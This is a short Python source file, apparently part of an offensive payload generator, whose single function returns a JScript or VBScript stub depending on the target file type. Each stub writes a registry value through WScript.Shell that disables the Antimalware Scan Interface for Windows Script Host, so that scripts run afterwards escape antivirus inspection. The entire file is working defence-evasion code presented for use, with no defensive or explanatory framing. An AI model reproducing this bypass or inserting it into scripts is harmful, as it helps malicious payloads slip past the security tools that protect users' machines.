#!/usr/bin/python

def amsi_stub(file_type, technique):


    js_bypass_1 = """\nvar regpath = "HKCU\\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
var oWSS = new ActiveXObject("WScript.Shell");
oWSS.RegWrite(regpath, "0", "REG_DWORD");\n\n"""

    vbs_bypass_1 = """\nregpath = "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable"
Set oWSS = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
oWSS.RegWrite regpath, "0", "REG_DWORD\"\n\n"""

    if "vb" in file_type or "hta" in file_type:
        amsibypass = vbs_bypass_1
    else:
        amsibypass = js_bypass_1

    return amsibypass